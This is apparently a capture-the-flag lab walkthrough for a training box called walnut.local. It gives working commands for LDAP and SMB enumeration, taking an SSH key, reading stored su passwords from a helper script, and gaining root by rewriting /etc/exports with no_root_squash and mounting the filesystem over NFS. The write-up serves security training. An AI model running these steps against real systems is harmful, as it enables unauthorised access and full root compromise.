# URL
https://www.hacksmarter.org/courses/966a53e1-2045-42c5-9724-0efbe438172e/
# Concepts
* ldap enumeration
* smb enumeration
* Bash script enumeration
* nfs service configuration
* extended access control enumeration
# Method of solve
## Starting Scans
* we are given:
  * a set of credentials for this challenge: `larryburns:IloveMontgommery!`
  * a domain for the server: `walnut.local`
* there are a lot of open ports on this server, but the ones we will pay attention to are:
  * 22: SSH
  * 139 / 445: SMB
  * 2049: NFS
  * 389: LDAP
## Initial Access
### LDAP
* after testing all the other services, it turns out our credentials are for the LDAP service:
```
ldapsearch -x -H ldap://walnut.local -D "uid=larryburns,ou=people,dc=walnut,dc=local" -w 'IloveMontgommery!' -b "dc=walnut,dc=local"
```
* we note that the syntax for this command uses the `uid` key with our username and the `ou` key with `people` as the value because we are dealing with a specific LDAP server (OpenLDAP)
* from the output of the command, we get the credentials for another account: `automation:asdh023incasdahff9`
### SMB
* the credentials we obtain for the `automation` user are for the SMB service:
```
nxc smb walnut.local -u automation -p asdh023incasdahff9 --share
```
* this lets us know there is an `automation` fileshare that this user has read / write access to:
```
smbclient //walnut.local/automation -U 'automation%asdh023incasdahff9'
```
* in this share, we can steal the user's SSH private key
## Privilege Escalation
### Bash Script Enumeration
* we discover a script owned by our user:
```Bash
PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`
su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```
* the flow of the script is a bit hard to puzzle out, but:
  * the script is run by other users (not the `automation` user) and runs an arbitrary command (`$PARM3`, aka `$2`)
  * and because the `su` command requires a password to be used to run, the script reads the password in from the `$PARM2` file in the `/home/automation/.hidden/` directory
  * that means that we can find the user's passwords in that directory
  * the usernames have been hashed, but the method is easily cracked from the users with shell login
  * the credentials we find are `localjob3:vyZzRcreRGDjbq9t19Tb`
## NFS Service Configuration Abuse
* this user has sudo permissions with a specific service:
```
User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```
* we previously found that the NFS service was a dead-end, no network file shares were available
* since we can restart the nfs service, if we could modify the configuration file for the nfs service, we could use it for privilege escalation
* the config file for the nfs service that specifies which shares are made available is at `/etc/exports`
* there's an unusual file permission on this file:
```
-rw-rw-r--+ 1 root root 425 Oct  3 02:54 /etc/exports
```
* the `+` in the file permissions indicates that this file has an extended ACL (access control list)
* we can enumerate the specifics using this command:
```
getfacl /etc/exports
```
* the output lets us know that our user specifically has read and write access to the file, which means we can share arbitrary fileshares with the nfs service
* we input the following into the `exports` file:
```
/     *(rw,sync,no_root_squash)
```
* this means we will share the entire filesystem with read/write access, and anyone accessing it can access it as root
* we then restart the service:
```
sudo /usr/bin/systemctl restart nfs-kernel-server.service
```
* afterwards we can mount the fileshare to our attacker machine and get root access:
```
showmount -e walnut.local
sudo mount -t nfs -o vers=4,nolock walnut.local:/ /tmp/mount
```
* done
